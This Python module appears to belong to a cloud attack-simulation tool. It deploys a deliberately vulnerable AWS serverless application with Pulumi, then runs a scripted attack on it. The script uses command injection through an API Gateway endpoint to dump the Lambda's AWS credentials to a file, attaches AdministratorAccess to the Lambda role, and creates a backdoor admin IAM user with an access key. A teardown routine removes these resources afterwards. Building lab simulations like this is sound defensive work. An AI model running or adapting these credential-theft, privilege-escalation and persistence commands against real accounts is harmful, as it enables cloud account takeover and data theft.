import os
import subprocess
import json
from tqdm import tqdm
from time import sleep
from termcolor import colored
from core.helpers import loading_animation
from core.report import gen_report_2

class ScenarioExecution:
    def __init__(self):
        pass

    def scenario_2_destroy(self):
        with open("./core/cobra-scenario-2-output.json", "r") as file:
            data = json.load(file)
        
        LAMBDA_ROLE_NAME = data["lambda-role-name"]

        print(colored("Deleting Manually Created resources - resources which are not tracked by Pulumi's State", color="red"))
        loading_animation()
        print("-"*30)
        
        subprocess.call("aws iam detach-user-policy --user-name devops --policy-arn arn:aws:iam::aws:policy/AdministratorAccess", shell=True)
        subprocess.call("aws iam list-access-keys --user-name devops | jq -r '.AccessKeyMetadata[0].AccessKeyId' | xargs -I {} aws iam delete-access-key --user-name devops --access-key-id {}", shell=True)
        subprocess.call("aws iam delete-user --user-name devops", shell=True)

        subprocess.call("aws iam list-role-policies --role-name "+LAMBDA_ROLE_NAME+" | jq -r '.PolicyNames[]' | xargs -I {} aws iam delete-role-policy --role-name "+LAMBDA_ROLE_NAME+" --policy-name {}", shell=True)
        subprocess.call("aws iam detach-role-policy --role-name "+LAMBDA_ROLE_NAME+" --policy-arn arn:aws:iam::aws:policy/AdministratorAccess", shell=True)

        subprocess.call("cd ./scenarios/scenario_2/infra/ && pulumi destroy -s cobra-scenario-2 --yes", shell=True)

    def get_data(self):
        
        with open("./core/cobra-scenario-2-output.json", "r") as file:
            data = json.load(file)

        with open("./core/cobra-scenario-2-output.json", "r") as file:
            data = json.load(file)

        self.API_GW_URL = data["apigateway-rest-endpoint"]
        self.LAMBDA_ROLE_NAME = data["lambda-role-name"]
        self.API_GW_ID = data["api-gateway-id"]
        self.LAMBDA_FUNC_ARN = data["lambda-func-name"]

    def exploit_serverless_app(self):
        self.get_data()
        
        print(colored("Exploiting the Application on API GW", color="red"))
        loading_animation()
        print("-"*30)   

        print(colored("Detected OS Injection through API GW, lambda backend, attempting credential exfil", color="red"))
        loading_animation()
        print("-"*30)   

        subprocess.call("curl '"+self.API_GW_URL+"?query=env' | grep -e AWS_ACCESS_KEY_ID -e AWS_SECRET_ACCESS_KEY -e AWS_SESSION_TOKEN >> token.txt", shell=True)
        print(colored("Successfully Exhilarated Lambda Role Creds", color="red"))
        loading_animation()
        print("-"*30)   

        creds = "export $(grep -e AWS_ACCESS_KEY_ID -e AWS_SECRET_ACCESS_KEY -e AWS_SESSION_TOKEN token.txt)"
        subprocess.call(""+creds+" && aws sts get-caller-identity --no-cli-pager", shell=True)
        
        print(colored("PrivEsc possible through this credential, Escalating role privileges", color="red"))
        subprocess.call(""+creds+" && aws iam attach-role-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --role-name "+self.LAMBDA_ROLE_NAME+"", shell=True)
        sleep_duration = 60
        with tqdm(total=sleep_duration, desc="Loading") as pbar:
            # Loop until sleep_duration is reached
            while sleep_duration > 0:
                # Sleep for a shorter interval to update the progress bar
                sleep_interval = min(1, sleep_duration)
                sleep(sleep_interval)
                
                # Update the progress bar with the elapsed time
                pbar.update(sleep_interval)
                sleep_duration -= sleep_interval

        print(colored("Creating a Backdoor User which can be used by the attacker", color="red"))
        loading_animation()
        print("-"*30)
        subprocess.call(""+creds+" && aws iam create-user --user-name devops --no-cli-pager", shell=True)
        subprocess.call(""+creds+" && aws iam attach-user-policy --user-name devops --policy-arn arn:aws:iam::aws:policy/AdministratorAccess", shell=True)
        subprocess.call(""+creds+" && aws iam create-access-key --user-name devops --no-cli-pager --query 'AccessKey.AccessKeyId'", shell=True)

        gen_report_2(self.API_GW_ID, self.LAMBDA_FUNC_ARN, self.API_GW_URL, self.LAMBDA_ROLE_NAME)

        subprocess.call("rm token.txt", shell=True)


    def scenario_2_execute(self):
        print("-"*30)
        print(colored("Executing Scenario 2 : Rest API exploit - command injection, credential exfiltration from backend lambda and privilege escalation, rogue identity creation & persistence ", color="red"))

        print(colored("Rolling out Infra", color="red"))
        loading_animation()
        print("-"*30)

        file_path = "./core/cobra-scenario-2-output.json"
        if os.path.exists(file_path):
            os.remove(file_path)
            print("File '{}' found and deleted.".format(file_path))
        else:
            print("File '{}' not found.".format(file_path))

        subprocess.call("cd ./scenarios/scenario_2/infra/ && pulumi up -s cobra-scenario-2 -y", shell=True)
        subprocess.call("cd ./scenarios/scenario_2/infra/ && pulumi stack -s cobra-scenario-2 output --json >> ../../../core/cobra-scenario-2-output.json", shell=True)
        ScenarioExecution().exploit_serverless_app()
        
       

    def post_execution(self):
        print(colored("Select Post Simulation Task:", color="yellow"))
        print(colored("1. Execute lambda server attack", color="green"))
        print(colored("2. Exit", color="green"))
        while True:
            try:
                choice = int(input(colored("Enter your choice: ", color="yellow")))
                if choice not in [1, 2]:
                    raise ValueError(colored("Invalid choice. Please enter 1, 2, 3, 4, 6 or 5.", color="red"))
                if choice == 1:
                    ScenarioExecution().exploit_serverless_app()
                    return
                elif choice == 2:
                    return
            except ValueError as e:
                print(e)
